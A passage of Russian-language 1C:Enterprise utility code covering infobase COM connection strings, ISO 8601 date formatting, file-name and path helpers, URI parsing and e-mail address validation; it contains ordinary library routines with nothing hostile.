		КраткоеОписаниеОшибки = НСтр(""ru = 'Прямое подключение к информационной базе недоступно на сервере под управлением ОС Linux.'"");
	#Иначе
		ПодключениеНедоступно = ЭтоLinuxКлиент() Или ЭтоOSXКлиент();
		КраткоеОписаниеОшибки = НСтр(""ru = 'Прямое подключение к информационной базе доступно только на клиенте под управлением ОС Windows.'"");
	#КонецЕсли
	
	Если ПодключениеНедоступно Тогда
		Результат.Соединение = Неопределено;
		Результат.КраткоеОписаниеОшибки = КраткоеОписаниеОшибки;
		Результат.ПодробноеОписаниеОшибки = КраткоеОписаниеОшибки;
		Возврат Результат;
	КонецЕсли;
	
	Попытка
		COMConnector = Новый COMObject(ИмяCOMСоединителя()); // ""V83.COMConnector""
	Исключение
		Информация = ИнформацияОбОшибке();
		СтрокаСообщенияОбОшибке = НСтр(""ru = 'Не удалось подключится к другой программе: %1'"");
		
		Результат.ОшибкаПодключенияКомпоненты = Истина;
		Результат.ПодробноеОписаниеОшибки = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(СтрокаСообщенияОбОшибке, ПодробноеПредставлениеОшибки(Информация));
		Результат.КраткоеОписаниеОшибки = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(СтрокаСообщенияОбОшибке, КраткоеПредставлениеОшибки(Информация));
		
		Возврат Результат;
	КонецПопытки;
	
	ФайловыйВариантРаботы = Параметры.ВариантРаботыИнформационнойБазы = 0;
	
	// Проверка корректности указания параметров.
	ОшибкаПроверкиЗаполнения = Ложь;
	Если ФайловыйВариантРаботы Тогда
		
		Если ПустаяСтрока(Параметры.КаталогИнформационнойБазы) Тогда
			СтрокаСообщенияОбОшибке = НСтр(""ru = 'Не задано месторасположение каталога информационной базы.'"");
			ОшибкаПроверкиЗаполнения = Истина;
		КонецЕсли;
		
	Иначе
		
		Если ПустаяСтрока(Параметры.ИмяСервера1СПредприятия) Или ПустаяСтрока(Параметры.ИмяИнформационнойБазыНаСервере1СПредприятия) Тогда
			СтрокаСообщенияОбОшибке = НСтр(""ru = 'Не заданы обязательные параметры подключения: """"Имя сервера""""; """"Имя информационной базы на сервере"""".'"");
			ОшибкаПроверкиЗаполнения = Истина;
		КонецЕсли;
		
	КонецЕсли;
	
	Если ОшибкаПроверкиЗаполнения Тогда
		
		Результат.ПодробноеОписаниеОшибки = СтрокаСообщенияОбОшибке;
		Результат.КраткоеОписаниеОшибки   = СтрокаСообщенияОбОшибке;
		Возврат Результат;
		
	КонецЕсли;
	
	// Формирование строки соединения.
	ШаблонСтрокиСоединения = ""[СтрокаБазы][СтрокаАутентификации]"";
	
	Если ФайловыйВариантРаботы Тогда
		СтрокаБазы = ""File = """"&КаталогИнформационнойБазы"""""";
		СтрокаБазы = СтрЗаменить(СтрокаБазы, ""&КаталогИнформационнойБазы"", Параметры.КаталогИнформационнойБазы);
	Иначе
		СтрокаБазы = ""Srvr = """"&ИмяСервера1СПредприятия""""; Ref = """"&ИмяИнформационнойБазыНаСервере1СПредприятия"""""";
		СтрокаБазы = СтрЗаменить(СтрокаБазы, ""&ИмяСервера1СПредприятия"",                     Параметры.ИмяСервера1СПредприятия);
		СтрокаБазы = СтрЗаменить(СтрокаБазы, ""&ИмяИнформационнойБазыНаСервере1СПредприятия"", Параметры.ИмяИнформационнойБазыНаСервере1СПредприятия);
	КонецЕсли;
	
	Если Параметры.АутентификацияОперационнойСистемы Тогда
		СтрокаАутентификации = """";
	Иначе
		
		Если СтрНайти(Параметры.ИмяПользователя, """""""") Тогда
			Параметры.ИмяПользователя = СтрЗаменить(Параметры.ИмяПользователя, """""""", """""""""""");
		КонецЕсли;
		
		Если СтрНайти(Параметры.ПарольПользователя, """""""") Тогда
			Параметры.ПарольПользователя = СтрЗаменить(Параметры.ПарольПользователя, """""""", """""""""""");
		КонецЕсли;
		
		СтрокаАутентификации = ""; Usr = """"&ИмяПользователя""""; Pwd = """"&ПарольПользователя"""""";
		СтрокаАутентификации = СтрЗаменить(СтрокаАутентификации, ""&ИмяПользователя"",    Параметры.ИмяПользователя);
		СтрокаАутентификации = СтрЗаменить(СтрокаАутентификации, ""&ПарольПользователя"", Параметры.ПарольПользователя);
	КонецЕсли;
	
	СтрокаСоединения = СтрЗаменить(ШаблонСтрокиСоединения, ""[СтрокаБазы]"", СтрокаБазы);
	СтрокаСоединения = СтрЗаменить(СтрокаСоединения, ""[СтрокаАутентификации]"", СтрокаАутентификации);
	
	Попытка
		Результат.Соединение = COMConnector.Connect(СтрокаСоединения);
	Исключение
		Информация = ИнформацияОбОшибке();
		СтрокаСообщенияОбОшибке = НСтр(""ru = 'Не удалось подключиться к другой программе: %1'"");
		
		Результат.ОшибкаПодключенияКомпоненты = Истина;
		Результат.ПодробноеОписаниеОшибки     = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(СтрокаСообщенияОбОшибке, ПодробноеПредставлениеОшибки(Информация));
		Результат.КраткоеОписаниеОшибки       = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(СтрокаСообщенияОбОшибке, КраткоеПредставлениеОшибки(Информация));
	КонецПопытки;
	
	Возврат Результат;
	
КонецФункции

// Получает картинку для вывода на странице с комментарием в зависимости
// от наличия текста в комментарии.
//
// Параметры:
//  Комментарий  - Строка - текст комментария.
//
// Возвращаемое значение:
//  Картинка - Картинка, которая должна отображаться на странице с комментарием.
//
Функция КартинкаКомментария(Комментарий) Экспорт

	Если НЕ ПустаяСтрока(Комментарий) Тогда
		Картинка = БиблиотекаКартинок.Комментарий;
	Иначе
		Картинка = Новый Картинка;
	КонецЕсли;
	
	Возврат Картинка;
	
КонецФункции

// Преобразует локальную дату к формату ""YYYY-MM-DDThh:mm:ssTZD"" согласно ISO 8601.
//
// Параметры:
//  ЛокальнаяДата - Дата - дата в часовом поясе сеанса.
// 
// Возвращаемое значение:
//   Строка - представление даты.
//
Функция ПредставлениеЛокальнойДатыСоСмещением(ЛокальнаяДата) Экспорт
	#Если Сервер Или ТолстыйКлиентОбычноеПриложение Или ВнешнееСоединение Тогда
		Смещение = СмещениеСтандартногоВремени(ЧасовойПоясСеанса());
	#Иначе
		Смещение = СтандартныеПодсистемыКлиент.ПараметрыРаботыКлиента().СмещениеСтандартногоВремени;
	#КонецЕсли
	ПредставлениеСмещения = ""Z"";
	Если Смещение > 0 Тогда
		ПредставлениеСмещения = ""+"";
	ИначеЕсли Смещение < 0 Тогда
		ПредставлениеСмещения = ""-"";
		Смещение = -Смещение;
	КонецЕсли;
	Если Смещение <> 0 Тогда
		ПредставлениеСмещения = ПредставлениеСмещения + Формат('00010101' + Смещение, ""ДФ=HH:mm"");
	КонецЕсли;
	
	Возврат Формат(ЛокальнаяДата, ""ДФ=yyyy-MM-ddTHH:mm:ss; ДП=0001-01-01T00:00:00"") + ПредставлениеСмещения;
КонецФункции

////////////////////////////////////////////////////////////////////////////////
// Функции для работы с файлами.
//

// Добавляет к переданному пути каталога конечный символ-разделитель, если он отсутствует.
//
// Параметры:
//  ПутьКаталога - Строка - путь к каталогу.
//  Платформа - ТипПлатформы - параметр устарел, больше не используется.
//
// Возвращаемое значение:
//  Строка - путь к каталогу с конечным символом-разделителем.
//
// Пример:
//  Результат = ДобавитьКонечныйРазделительПути(""C:\Мой каталог""); // возвращает ""C:\Мой каталог\"".
//  Результат = ДобавитьКонечныйРазделительПути(""C:\Мой каталог\""); // возвращает ""C:\Мой каталог\"".
//  Результат = ДобавитьКонечныйРазделительПути(""%APPDATA%""); // возвращает ""%APPDATA%\"".
//
Функция ДобавитьКонечныйРазделительПути(Знач ПутьКаталога, Знач Платформа = Неопределено) Экспорт
	Если ПустаяСтрока(ПутьКаталога) Тогда
		Возврат ПутьКаталога;
	КонецЕсли;
	
	ДобавляемыйСимвол = ПолучитьРазделительПути();
	
	Если СтрЗаканчиваетсяНа(ПутьКаталога, ДобавляемыйСимвол) Тогда
		Возврат ПутьКаталога;
	Иначе 
		Возврат ПутьКаталога + ДобавляемыйСимвол;
	КонецЕсли;
КонецФункции

// Составляет полное имя файла из имени каталога и имени файла.
//
// Параметры:
//  ИмяКаталога  - Строка - путь к каталогу файла на диске.
//  ИмяФайла     - Строка - имя файла, без имени каталога.
//
// Возвращаемое значение:
//   Строка - полное имя файла с учетом каталога.
//
Функция ПолучитьПолноеИмяФайла(Знач ИмяКаталога, Знач ИмяФайла) Экспорт

	Если НЕ ПустаяСтрока(ИмяФайла) Тогда
		
		Слэш = """";
		Если (Прав(ИмяКаталога, 1) <> ""\"") И (Прав(ИмяКаталога, 1) <> ""/"") Тогда
			Слэш = ?(СтрНайти(ИмяКаталога, ""\"") = 0, ""/"", ""\"");
		КонецЕсли;
		
		Возврат ИмяКаталога + Слэш + ИмяФайла;
		
	Иначе
		
		Возврат ИмяКаталога;
		
	КонецЕсли;

КонецФункции

// Раскладывает полное имя файла на составляющие.
//
// Параметры:
//  ПолноеИмяФайла - Строка - полный путь к файлу.
//  ЭтоПапка - Булево - признак того, что требуется разложить полное имя папки, а не файла.
//
// Возвращаемое значение:
//   Структура - имя файла, разложенное на составные части(аналогично свойствам объекта Файл):
//		ПолноеИмя - Содержит полный путь к файлу, т.е. полностью соответствует входному параметру ПолноеИмяФайла.
//		Путь - Содержит путь к каталогу, в котором лежит файл.
//		Имя - Содержит имя файла с расширением, без пути к файлу.
//		Расширение - Содержит расширение файла.
//		ИмяБезРасширения - Содержит имя файла без расширения и без пути к файлу.
//			Пример: если ПолноеИмяФайла = ""c:\temp\test.txt"", то структура заполнится следующим образом:
//				ПолноеИмя: ""c:\temp\test.txt"".
//				Путь: ""c:\temp\""
//				Имя: ""test.txt""
//				Расширение: "".txt""
//				ИмяБезРасширения: ""test"".
//
Функция РазложитьПолноеИмяФайла(Знач ПолноеИмяФайла, ЭтоПапка = Ложь) Экспорт
	
	СтруктураИмениФайла = Новый Структура(""ПолноеИмя,Путь,Имя,Расширение,ИмяБезРасширения"");
	
	// Убираем из полного имени файла завершающий слеш и сохраняем получившееся полное имя в структуре.
	Если ЭтоПапка И (Прав(ПолноеИмяФайла, 1) = ""/"" Или Прав(ПолноеИмяФайла, 1) = ""\"") Тогда
		Если ЭтоПапка Тогда
			ПолноеИмяФайла = Сред(ПолноеИмяФайла, 1, СтрДлина(ПолноеИмяФайла) - 1);
		Иначе
			// Если путь к файлу заканчивается слешем, то у файла нет имени.
			СтруктураИмениФайла.Вставить(""ПолноеИмя"", ПолноеИмяФайла); 
			СтруктураИмениФайла.Вставить(""Путь"", ПолноеИмяФайла); 
			СтруктураИмениФайла.Вставить(""Имя"", """"); 
			СтруктураИмениФайла.Вставить(""Расширение"", """"); 
			СтруктураИмениФайла.Вставить(""ИмяБезРасширения"", """"); 
			Возврат СтруктураИмениФайла;
		КонецЕсли;
	КонецЕсли;
	СтруктураИмениФайла.Вставить(""ПолноеИмя"", ПолноеИмяФайла); 
	
	// Если полное имя файла оказалось пустым, то остальные параметры структуры возвращаем пустыми.
	Если СтрДлина(ПолноеИмяФайла) = 0 Тогда 
		СтруктураИмениФайла.Вставить(""Путь"", """"); 
		СтруктураИмениФайла.Вставить(""Имя"", """"); 
		СтруктураИмениФайла.Вставить(""Расширение"", """"); 
		СтруктураИмениФайла.Вставить(""ИмяБезРасширения"", """"); 
		Возврат СтруктураИмениФайла;
	КонецЕсли;
	
	// Выделяем путь к файлу и имя файла.
	Если СтрНайти(ПолноеИмяФайла, ""/"") > 0 Тогда
		ПозицияРазделителя = СтрНайти(ПолноеИмяФайла, ""/"", НаправлениеПоиска.СКонца);
	ИначеЕсли СтрНайти(ПолноеИмяФайла, ""\"") > 0 Тогда
		ПозицияРазделителя = СтрНайти(ПолноеИмяФайла, ""\"", НаправлениеПоиска.СКонца);
	Иначе
		ПозицияРазделителя = 0;
	КонецЕсли;
	СтруктураИмениФайла.Вставить(""Путь"", Лев(ПолноеИмяФайла, ПозицияРазделителя)); 
	СтруктураИмениФайла.Вставить(""Имя"", Сред(ПолноеИмяФайла, ПозицияРазделителя + 1));
	
	// Папки не имеют расширений, а для файла выделяем расширение.
	Если ЭтоПапка Тогда
		СтруктураИмениФайла.Вставить(""Расширение"", """");
		СтруктураИмениФайла.Вставить(""ИмяБезРасширения"", СтруктураИмениФайла.Имя);
	Иначе
		ПозицияТочки = СтрНайти(СтруктураИмениФайла.Имя, ""."", НаправлениеПоиска.СКонца);
		Если ПозицияТочки = 0 Тогда
			СтруктураИмениФайла.Вставить(""Расширение"", """");
			СтруктураИмениФайла.Вставить(""ИмяБезРасширения"", СтруктураИмениФайла.Имя);
		Иначе
			СтруктураИмениФайла.Вставить(""Расширение"", Сред(СтруктураИмениФайла.Имя, ПозицияТочки));
			СтруктураИмениФайла.Вставить(""ИмяБезРасширения"", Лев(СтруктураИмениФайла.Имя, ПозицияТочки - 1));
		КонецЕсли;
	КонецЕсли;
	
	Возврат СтруктураИмениФайла;
	
КонецФункции

// Разбирает строку URI на составные части и возвращает в виде структуры.
// На основе RFC 3986.
//
// Параметры:
//  СтрокаURI - Строка - ссылка на ресурс в формате:
//                       <схема>://<логин>:<пароль>@<хост>:<порт>/<путь>?<параметры>#<якорь>.
//
// Возвращаемое значение:
//  Структура - составные части URI согласно формату:
//   * Схема         - Строка - схема из URI.
//   * Логин         - Строка - логин из URI.
//   * Пароль        - Строка - пароль из URI.
//   * ИмяСервера    - Строка - часть <хост>:<порт> из URI.
//   * Хост          - Строка - хост из URI.
//   * Порт          - Строка - порт из URI.
//   * ПутьНаСервере - Строка - часть <путь>?<параметры>#<якорь> из URI.
//
Функция СтруктураURI(Знач СтрокаURI) Экспорт
	
	СтрокаURI = СокрЛП(СтрокаURI);
	
	// схема
	Схема = """";
	Позиция = СтрНайти(СтрокаURI, ""://"");
	Если Позиция > 0 Тогда
		Схема = НРег(Лев(СтрокаURI, Позиция - 1));
		СтрокаURI = Сред(СтрокаURI, Позиция + 3);
	КонецЕсли;
	
	// Строка соединения и путь на сервере.
	СтрокаСоединения = СтрокаURI;
	ПутьНаСервере = """";
	Позиция = СтрНайти(СтрокаСоединения, ""/"");
	Если Позиция > 0 Тогда
		ПутьНаСервере = Сред(СтрокаСоединения, Позиция + 1);
		СтрокаСоединения = Лев(СтрокаСоединения, Позиция - 1);
	КонецЕсли;
	
	// Информация пользователя и имя сервера.
	СтрокаАвторизации = """";
	ИмяСервера = СтрокаСоединения;
	Позиция = СтрНайти(СтрокаСоединения, ""@"");
	Если Позиция > 0 Тогда
		СтрокаАвторизации = Лев(СтрокаСоединения, Позиция - 1);
		ИмяСервера = Сред(СтрокаСоединения, Позиция + 1);
	КонецЕсли;
	
	// логин и пароль
	Логин = СтрокаАвторизации;
	Пароль = """";
	Позиция = СтрНайти(СтрокаАвторизации, "":"");
	Если Позиция > 0 Тогда
		Логин = Лев(СтрокаАвторизации, Позиция - 1);
		Пароль = Сред(СтрокаАвторизации, Позиция + 1);
	КонецЕсли;
	
	// хост и порт
	Хост = ИмяСервера;
	Порт = """";
	Позиция = СтрНайти(ИмяСервера, "":"");
	Если Позиция > 0 Тогда
		Хост = Лев(ИмяСервера, Позиция - 1);
		Порт = Сред(ИмяСервера, Позиция + 1);
		Если Не СтроковыеФункцииКлиентСервер.ТолькоЦифрыВСтроке(Порт) Тогда
			Порт = """";
		КонецЕсли;
	КонецЕсли;
	
	Результат = Новый Структура;
	Результат.Вставить(""Схема"", Схема);
	Результат.Вставить(""Логин"", Логин);
	Результат.Вставить(""Пароль"", Пароль);
	Результат.Вставить(""ИмяСервера"", ИмяСервера);
	Результат.Вставить(""Хост"", Хост);
	Результат.Вставить(""Порт"", ?(ПустаяСтрока(Порт), Неопределено, Число(Порт)));
	Результат.Вставить(""ПутьНаСервере"", ПутьНаСервере);
	
	Возврат Результат;
	
КонецФункции

// Функция раскладывает Строку в массив строк, используя ""./\"" как разделитель.
//
// Параметры:
//  Строка - Строка - исходная строка.
//
// Возвращаемое значение:
//  Массив - коллекция фрагментов строки.
//
Функция РазложитьСтрокуПоТочкамИСлэшам(Знач Строка) Экспорт
	
	Перем ТекущаяПозиция;
	
	Фрагменты = Новый Массив;
	
	НачальнаяПозиция = 1;
	
	Для ТекущаяПозиция = 1 По СтрДлина(Строка) Цикл
		ТекущийСимвол = Сред(Строка, ТекущаяПозиция, 1);
		Если ТекущийСимвол = ""."" Или ТекущийСимвол = ""/"" Или ТекущийСимвол = ""\"" Тогда
			ТекущийФрагмент = Сред(Строка, НачальнаяПозиция, ТекущаяПозиция - НачальнаяПозиция);
			НачальнаяПозиция = ТекущаяПозиция + 1;
			Фрагменты.Добавить(ТекущийФрагмент);
		КонецЕсли;
	КонецЦикла;
	
	Если НачальнаяПозиция <> ТекущаяПозиция Тогда
		ТекущийФрагмент = Сред(Строка, НачальнаяПозиция, ТекущаяПозиция - НачальнаяПозиция);
		Фрагменты.Добавить(ТекущийФрагмент);
	КонецЕсли;
	
	Возврат Фрагменты;
	
КонецФункции

// Выделяет из имени файла его расширение (набор символов после последней точки).
//
// Параметры:
//  ИмяФайла - Строка - имя файла с именем каталога или без.
//
// Возвращаемое значение:
//   Строка - расширение файла.
//
Функция ПолучитьРасширениеИмениФайла(Знач ИмяФайла) Экспорт
	
	Расширение = """";
	
	ПозицияСимвола = СтрДлина(ИмяФайла);
	Пока ПозицияСимвола >= 1 Цикл
		
		Если Сред(ИмяФайла, ПозицияСимвола, 1) = ""."" Тогда
			
			Расширение = Сред(ИмяФайла, ПозицияСимвола + 1);
			Прервать;
		КонецЕсли;
		
		ПозицияСимвола = ПозицияСимвола - 1;
	КонецЦикла;

	Возврат Расширение;
	
КонецФункции

// Преобразует расширение файла в нижний регистр без точки.
//
// Параметры:
//  Расширение - Строка - Расширение для преобразования.
//
// Возвращаемое значение:
//  Строка - преобразованное расширение.
//
Функция РасширениеБезТочки(Знач Расширение) Экспорт
	
	Расширение = НРег(СокрЛП(Расширение));
	
	Если Сред(Расширение, 1, 1) = ""."" Тогда
		Расширение = Сред(Расширение, 2);
	КонецЕсли;
	
	Возврат Расширение;
	
КонецФункции

// Возвращает имя файла с расширением.
// Если расширение пустое, тогда точка не добавляется.
//
// Параметры:
//  ИмяБезРасширения - Строка - имя файла без расширения.
//  Расширение       - Строка - расширение.
//
// Возвращаемое значение:
//  Строка - имя файла с расширением.
//
Функция ПолучитьИмяСРасширением(ИмяБезРасширения, Расширение) Экспорт
	
	ИмяСРасширением = ИмяБезРасширения;
	
	Если Расширение <> """" Тогда
		ИмяСРасширением = ИмяСРасширением + ""."" + Расширение;
	КонецЕсли;
	
	Возврат ИмяСРасширением;
	
КонецФункции

// Возвращает строку недопустимых символов.
// Согласно http://en.wikipedia.org/wiki/Filename - в разделе ""Reserved characters and words"".
// Возвращаемое значение:
//   Строка - строка недопустимых символов.
Функция ПолучитьНедопустимыеСимволыВИмениФайла() Экспорт

	НедопустимыеСимволы = """"""/\[]:;|=?*<>"";
	НедопустимыеСимволы = НедопустимыеСимволы + Символы.Таб;
	Возврат НедопустимыеСимволы;

КонецФункции

// Проверяет наличие недопустимых символов в имени файла.
//
// Параметры:
//  ИмяФайла  - Строка - имя файла.
//
// Возвращаемое значение:
//   Массив   - массив обнаруженных в имени файла недопустимых символов.
//              Если недопустимых символов не обнаружено - возвращается пустой массив.
Функция НайтиНедопустимыеСимволыВИмениФайла(ИмяФайла) Экспорт

	НедопустимыеСимволы = ПолучитьНедопустимыеСимволыВИмениФайла();
	
	МассивНайденныхНедопустимыхСимволов = Новый Массив;
	
	Для ПозицияСимвола = 1 По СтрДлина(НедопустимыеСимволы) Цикл
		ПроверяемыйСимвол = Сред(НедопустимыеСимволы,ПозицияСимвола,1);
		Если СтрНайти(ИмяФайла,ПроверяемыйСимвол) <> 0 Тогда
			МассивНайденныхНедопустимыхСимволов.Добавить(ПроверяемыйСимвол);
		КонецЕсли;
	КонецЦикла;
	
	Возврат МассивНайденныхНедопустимыхСимволов;

КонецФункции

// Заменяет недопустимые символы в имени файла.
//
// Параметры:
//  ИмяФайла     - Строка - исходное имя файла.
//  НаЧтоМенять  - Строка - строка, на которую необходимо заменить недопустимые символы.
//
// Возвращаемое значение:
//   Строка - преобразованное имя файла.
//
Функция ЗаменитьНедопустимыеСимволыВИмениФайла(Знач ИмяФайла, НаЧтоМенять = "" "") Экспорт

	Результат = ИмяФайла;
	МассивНайденныхНедопустимыхСимволов = НайтиНедопустимыеСимволыВИмениФайла(Результат);
	Для Каждого НедопустимыйСимвол Из МассивНайденныхНедопустимыхСимволов Цикл
		Результат = СтрЗаменить(Результат, НедопустимыйСимвол, НаЧтоМенять);
	КонецЦикла;
	
	Возврат Результат;

КонецФункции

////////////////////////////////////////////////////////////////////////////////
// Функции для работы с почтовыми адресами.
//

// Разбирает строку с адресами электронной почты. При разборе проверяет корректность адресов.
//
// Параметры:
//  СписокАдресов - Строка - адреса электронной почты, разделитель - запятая, либо точка с запятой:
//                           Получатель1 <Адрес1>, Получатель 2 <Адрес2>... Получатель N <АдресN>.
//
// Возвращаемое значение:
//  Массив - содержит массив структур адресов.
//           Поля структуры:
//             Псевдоним      - Строка - представление адресата.
//             Адрес          - Строка - найденный и соответствующий требованиям почтовый адрес;
//                                       Если текст, похожий на адрес найден, но не соответствует требованиям
//                                       стандартов, то такой текст записывается в поле ""Псевдоним"".
//             ОписаниеОшибки - Строка - текстовое представление ошибки, либо пустая строка, если ошибок нет.
//
Функция АдресаЭлектроннойПочтыИзСтроки(Знач СписокАдресов) Экспорт
	
	Результат = Новый Массив;
	
	// заменяем скобки на пробелы
	СимволыСкобок = ""<>()[]"";
	Строка = ЗаменитьСимволыВСтрокеНаПробелы(СписокАдресов, СимволыСкобок);
	
	// Приводим разделители к одному виду.
	Строка = СтрЗаменить(Строка, "","", "";"");
	
	// Раскладываем mailbox-list на mailbox'ы.
	МассивАдресов = СтрРазделить(Строка, "";"", Ложь);
	
	// Допустимые символы для псевдонима (display-name).
	Буквы = ""abcdefghijklmnopqrstuvwxyzабвгдеёжзийклмнопрстуфхцчшщъыьэюя"";
	Цифры = ""0123456789"";
	ДополнительныеСимволы = ""._- :+"""""";
	
	// Выделяем из строки адреса (mailbox'а) псевдоним (display-name) и адрес (addr-spec).
	Для Каждого СтрокаАдреса Из МассивАдресов Цикл
		Если ПустаяСтрока(СтрокаАдреса) Тогда
			Продолжить;
		КонецЕсли;
		
		Псевдоним = """";
		Адрес = """";
		ОписаниеОшибки = """";
		
		Если СтрЧислоВхождений(СтрокаАдреса, ""@"") <> 1 Тогда
			Псевдоним = СтрокаАдреса;
		Иначе
			// Все, что не подходит в качестве адреса, складываем в псевдоним.
			Для Каждого Подстрока Из СтрРазделить(СтрокаАдреса, "" "", Ложь) Цикл
				Если ПустаяСтрока(Адрес) И АдресЭлектроннойПочтыСоответствуетТребованиям(Подстрока) Тогда
					Адрес = Подстрока;
				Иначе
					Псевдоним = Псевдоним + "" "" + Подстрока;
				КонецЕсли;
			КонецЦикла;
		КонецЕсли;
		
		Псевдоним = СокрЛП(Псевдоним);
		
		// проверки
		ЕстьНедопустимыеСимволыВПсевдониме = Не СтрокаСодержитТолькоДопустимыеСимволы(НРег(Псевдоним), Буквы + Цифры + ДополнительныеСимволы);
		АдресОпределен = Не ПустаяСтрока(Адрес);
		ЕстьПризнакНаличияАдресаВСтроке = СтрНайти(СтрокаАдреса, ""@"") > 0;
		
		Если АдресОпределен Тогда 
			Если ЕстьНедопустимыеСимволыВПсевдониме Тогда
				ОписаниеОшибки = НСтр(""ru = 'Представление содержит недопустимые символы'"");
			КонецЕсли;
		Иначе
			Если ЕстьПризнакНаличияАдресаВСтроке Тогда 
				ОписаниеОшибки = НСтр(""ru = 'Адрес электронной почты содержит ошибки'"");
			Иначе
				ОписаниеОшибки = НСтр(""ru = 'Строка не содержит адреса электронной почты'"");
			КонецЕсли;
		КонецЕсли;
		
		СтруктураАдреса = Новый Структура(""Псевдоним,Адрес,ОписаниеОшибки"", Псевдоним, Адрес, ОписаниеОшибки);
		Результат.Добавить(СтруктураАдреса);
	КонецЦикла;
	
	Возврат Результат;
	
КонецФункции

// Проверяет email адрес на соответствие требованиям стандартов RFC 5321, RFC 5322,
// а также RFC 5335, RFC 5336 и RFC 3696.
// Кроме того, функция ограничивает использование спецсимволов.
// 
// Параметры:
//  Адрес - Строка - проверяемый email.
//  РазрешитьЛокальныеАдреса - Булево - не выдавать ошибку в случае отсутствия зоны домена в адресе.
//
// Возвращаемое значение:
//  Булево - Истина, если ошибок нет.
//
Функция АдресЭлектроннойПочтыСоответствуетТребованиям(Знач Адрес, РазрешитьЛокальныеАдреса = Ложь) Экспорт
	
	// Допустимые символы для email.
	Буквы = ""abcdefghijklmnopqrstuvwxyzабвгдеёжзийклмнопрстуфхцчшщъыьэюя"";
	Цифры = ""0123456789"";
	СпецСимволы = "".@_-:+"";
	
	// проверяем символ @
	Если СтрЧислоВхождений(Адрес, ""@"") <> 1 Тогда
		Возврат Ложь;
	КонецЕсли;
	
	// Разрешаем двоеточие только один раз.
	Если СтрЧислоВхождений(Адрес, "":"") > 1 Тогда
		Возврат Ложь;
	КонецЕсли;
	
	// проверяем две точки подряд
	Если СтрНайти(Адрес, "".."") > 0 Тогда
		Возврат Ложь;
	КонецЕсли;
	
	// Приводим строку адреса к нижнему регистру.
	Адрес = НРег(Адрес);
	
	// Проверяем допустимые символы.
	Если Не СтрокаСодержитТолькоДопустимыеСимволы(Адрес, Буквы + Цифры + СпецСимволы) Тогда
		Возврат Ложь;
	КонецЕсли;
	
	// Разбираем адрес на local-part и domain.
	Позиция = СтрНайти(Адрес,""@"");
	ЛокальноеИмя = Лев(Адрес, Позиция - 1);
	Домен = Сред(Адрес, Позиция + 1);
	
	// Проверяем на заполненность и допустимость длины.
	Если ПустаяСтрока(ЛокальноеИмя)
	 	Или ПустаяСтрока(Домен)
		Или СтрДлина(ЛокальноеИмя) > 64
		Или СтрДлина(Домен) > 255 Тогда
		
		Возврат Ложь;
	КонецЕсли;
	
	// Проверяем наличие спецсимволов в начале и в конце домена.
	Если ЕстьСимволыВНачалеВКонце(Домен, СпецСимволы) Тогда
		Возврат Ложь;
	КонецЕсли;
	
	// В домене должна быть минимум одна точка.
	Если Не РазрешитьЛокальныеАдреса И СтрНайти(Домен,""."") = 0 Тогда
		Возврат Ложь;
	КонецЕсли;
	
	// В домене не должно быть символа подчеркивания.
	Если СтрНайти(Домен,""_"") > 0 Тогда
		Возврат Ложь;
	КонецЕсли;
	
	// В домене не должно быть символа двоеточие.
	Если СтрНайти(Домен,"":"") > 0 Тогда
		Возврат Ложь;
	КонецЕсли;
	
	// В домене не должно быть символа ""плюс"".
	Если СтрНайти(Домен,""+"") > 0 Тогда
		Возврат Ложь;
	КонецЕсли;
	
	// Выделяем зону (TLD) из имени домена.
	Зона = Домен;
	Позиция = СтрНайти(Зона,""."");
	Пока Позиция > 0 Цикл
		Зона = Сред(Зона, Позиция + 1);
		Позиция = СтрНайти(Зона,""."");
	КонецЦикла;
	
	// Проверяем зону домена (минимум 2 символа, только буквы).
	Возврат РазрешитьЛокальныеАдреса Или СтрДлина(Зона) >= 2 И СтрокаСодержитТолькоДопустимыеСимволы(Зона,Буквы);
	
КонецФункции

// Функция проверяет, что введенная строка с e-mail адресами введена правильно.
//
//  Формат строки:
//  Z = ИмяПользователя|[Имя Пользователя] [<]пользователь@почтовый_сервер[>], Строка = Z[<разделитель*>Z].
// 
//   Прим.: разделитель* - имеется ввиду любой разделитель адресов.
//
// Параметры:
//  СтрокаПереданныхАдресов - Строка - правильная строка с почтовыми адресами.
//  ВызыватьИсключение - Булево - необходимо передать Ложь, чтобы в случае неуспешного разбора не выдавалось исключение.
//
// Возвращаемое значение:
//  Структура - результат разбора:
//   * Статус - Булево - успех или неуспех преобразования
//   * Значение - Массив - (параметр доступен, если Статус = Истина) коллекция адресов в виде структур:
//    ** Адрес - Строка - e-mail получателя.
//    ** Представление - Строка - имя получателя.
//   * СообщениеОбОшибке - Строка - (параметр доступен, если Статус = Ложь) информация об ошибке.
//
//  ВАЖНО: Функция возвращает массив структур, в которых одно поле (любое)
//         может быть незаполнено. Может использоваться различными
//         подсистемами для собственного сопоставления имени пользователя
//         некому e-mail адресу. Поэтому, необходимо перед непосредственной
//         отправкой проверить, что поле почтового адреса заполнено.
//
Функция РазобратьСтрокуСПочтовымиАдресами(Знач СтрокаПереданныхАдресов, ВызыватьИсключение = Истина) Экспорт
	
	Результат = Новый Массив;
	
	НедопустимыеСимволы = ""!#$%^&*()`~|\/="";
	
	СообщениеНедопустимыеСимволы = НСтр(""ru = 'Недопустимый символ """"%1"""" в адресе электронной почты """"%2""""'"");
	СообщениеНеверныйФорматПочтовогоАдреса = НСтр(""ru = 'Некорректный адрес электронной почты """"%1""""'"");
	
	СтрокаПереданныхАдресов = СтрЗаменить(СтрокаПереданныхАдресов, "","", "";"");
	МассивПодстрокКОбработке = СтрРазделить(СокрЛП(СтрокаПереданныхАдресов), "";"", Ложь);
	
	Для Каждого СтрокаАдреса Из МассивПодстрокКОбработке Цикл
		
		Индекс = 1;               // Номер обрабатываемого символа.
		Накопитель = """";          // Накопитель символов, после анализа перемещается либо в полное имя
		// либо в почтовый адрес.
		ПолноеИмяАдресата = """";   // Переменная, накапливающая имя адресата.
		ПочтовыйАдрес = """";       // Переменная, накапливающая e-mail адрес
		// 1 - формирование полного имени: ожидаются любые допустимые символы имени адресата
		// 2 - формирование почтового адреса: ожидаются любые допустимые символы email адреса
		// 3 - завершение формирования очередного почтового адреса - ожидаются символы разделители либо пробелы.
		СтадияРазбора = 1; 
		
		Пока Индекс <= СтрДлина(СтрокаАдреса) Цикл
			
			Символ = Сред(СтрокаАдреса, Индекс, 1);
			
			Если      Символ = "" "" Тогда
